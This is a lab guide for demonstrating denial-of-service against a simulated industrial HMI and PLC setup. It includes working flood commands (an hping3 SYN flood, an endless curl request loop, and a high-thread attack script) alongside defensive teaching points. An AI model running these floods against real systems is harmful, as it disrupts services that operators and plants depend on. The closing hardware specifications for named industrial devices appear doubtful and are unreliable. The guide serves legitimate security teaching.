# DoS Training Demonstration Guide

## Realistic DoS Demonstration Options

### Current Setup (Recommended)
- **Flask development server**: Single-threaded, no production hardening
- **No artificial delays**: Mirrors real embedded HMI behavior
- **Vulnerability**: Limited concurrent connection handling

### Option 1: Resource-Constrained VM (Most Realistic)

Configure Windows VM with limited resources to mirror embedded HMI systems:

**VM Settings:**
- RAM: 512MB - 1GB
- CPU: 1 core
- Network: 100Mbps limit

**Why this works:**
- Real industrial HMIs run on embedded systems with limited resources
- PLCs typically have 256MB-1GB RAM
- Makes DoS attacks visibly effective

### Option 2: Aggressive Attack Parameters

Increase attack intensity in `dos_attack.py`:

```python
ATTACK_THREADS = 500  # More threads
```

Or use multiple attack machines simultaneously.

### Option 3: Network Latency Simulation

Add realistic industrial network conditions:

**On Linux (Kali):**
```bash
# Add 100ms latency
sudo tc qdisc add dev eth0 root netem delay 100ms

# Remove latency
sudo tc qdisc del dev eth0 root
```

### Option 4: Combined Attack Vectors

Run multiple attacks simultaneously:

**Terminal 1:**
```bash
python dos_attack.py <VM_IP>
```

**Terminal 2:**
```bash
sudo hping3 -S --flood -p 5000 <VM_IP>
```

**Terminal 3:**
```bash
while true; do curl http://<VM_IP>:5000/api/data & done
```

## Demonstration Script

### Setup (5 minutes)
1. Start PLC: `python plc.py`
2. Start HMI: `python hmi.py`
3. Open browser to http://localhost:5000
4. Show normal operation (pump/valve controls)

### Attack Phase (10 minutes)
1. Open browser DevTools (F12) → Network tab
2. Start DoS attack: `python dos_attack.py <VM_IP>`
3. **Observe:**
   - API requests timing out
   - UI freezing/lagging
   - Connection errors in console
   - PLC terminal still running

### Recovery Phase (5 minutes)
1. Stop attack (Ctrl+C)
2. Show HMI recovering
3. Show PLC continued operation throughout

## Troubleshooting

### Attack Not Effective?

**Solution 1: Reduce VM Resources**
- Lower RAM to 512MB
- Set CPU to 1 core
- Restart VM

**Solution 2: Increase Attack Intensity**
```python
# In dos_attack.py
ATTACK_THREADS = 500
```

**Solution 3: Use Production WSGI Server**
If you want to show the difference between vulnerable and hardened systems:

```bash
# Install gunicorn
pip install gunicorn

# Run with limited workers (vulnerable)
gunicorn -w 1 -b 0.0.0.0:5000 hmi:app

# Run with multiple workers (more resilient)
gunicorn -w 4 -b 0.0.0.0:5000 hmi:app
```

### Windows Firewall Blocking?

```cmd
# Allow port 5000
netsh advfirewall firewall add rule name="HMI Server" dir=in action=allow protocol=TCP localport=5000
```

## Key Teaching Points

1. **Separation of Concerns**: PLC continues running when HMI is down
2. **Single Point of Failure**: One HMI serves all operators
3. **No Rate Limiting**: Flask dev server has no built-in protection
4. **Resource Exhaustion**: Limited connections cause cascading failures
5. **Defense Strategies**: Network segmentation, redundancy, rate limiting

## Real-World Context

- **Siemens S7-1200 PLC**: 256MB RAM, 1 CPU core
- **Allen-Bradley PanelView**: 512MB RAM, ARM processor
- **Schneider Electric HMI**: 1GB RAM, embedded Linux
- **Industrial Networks**: 10-100Mbps, 50-200ms latency

This simulation mirrors these real-world constraints.
